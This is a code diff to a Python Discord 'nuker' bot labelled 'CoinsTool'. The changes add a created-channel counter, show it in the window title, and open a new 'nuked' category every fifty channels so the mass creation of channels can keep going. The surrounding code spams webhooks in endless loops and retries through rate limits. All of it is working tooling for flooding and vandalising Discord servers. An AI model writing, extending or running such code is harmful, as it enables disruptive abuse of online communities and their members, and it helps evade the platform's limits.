@@ -1,4 +1,5 @@
 category=""
+channels = 0
 import os
 import time
 import asyncio
@@ -74,6 +75,7 @@ bot = commands.Bot(command_prefix='>',intents=intents,help_command=None,activity
 def spam_webhook(webhook):
     global white
     global red
+    global channels
     while True:
         try:
             url = webhook.url
@@ -81,7 +83,7 @@ def spam_webhook(webhook):
             r=httpx.post(url,json=data)
             if r.status_code == 204:
                 idk()
-                os.system(f"title (CoinsTool) Nuker - {x} messages sent")
+                os.system(f"title (CoinsTool) Nuker - {x} messages sent - {channels} Channels Created")
             else:
                 sleeptime = r.json()["retry_after"]
                 print(f"{purple}Webhook {white}- {red}Rate Limit! {cyan}Sleeping for: {sleeptime}s{white}")
@@ -128,10 +130,12 @@ async def forever_send_msg2(channel,retry=False):
         print(red+str(e)+white)
         pass
 async def create_channel(guild,name,cat):
+    global channels
     try:
         print(f"{purple}Waiting to create text channel... {white}")
         try:
             channel = await guild.create_text_channel(str(name),category=cat)
+            channels+=1
             ch = True
         except:
             print(f"{red}Text Channel Create - Rate limit, retrying...{white}")
@@ -146,10 +150,12 @@ async def create_channel(guild,name,cat):
         print(red+str(e)+white)
         pass
 async def create_channel2(guild,name,cat):
+    global channels
     try:
         print(f"{purple}Waiting to create text channel... {white}")
         try:
             channel = await guild.create_text_channel(str(name),category=cat)
+            channels+=1
             ch = True
         except:
             print(f"{red}Text Channel Create - Rate limit, retrying...{white}")
@@ -165,6 +171,10 @@ async def create_channel2(guild,name,cat):
         pass
 async def nuke(guild):
     global category
+    global channels
+    if(channels>49):
+        channels = 0
+        category = await guild.create_category("nuked")
     await create_channel(guild=guild,name="nuked",cat=category)
 async def start_nuke(guild):
     while True:
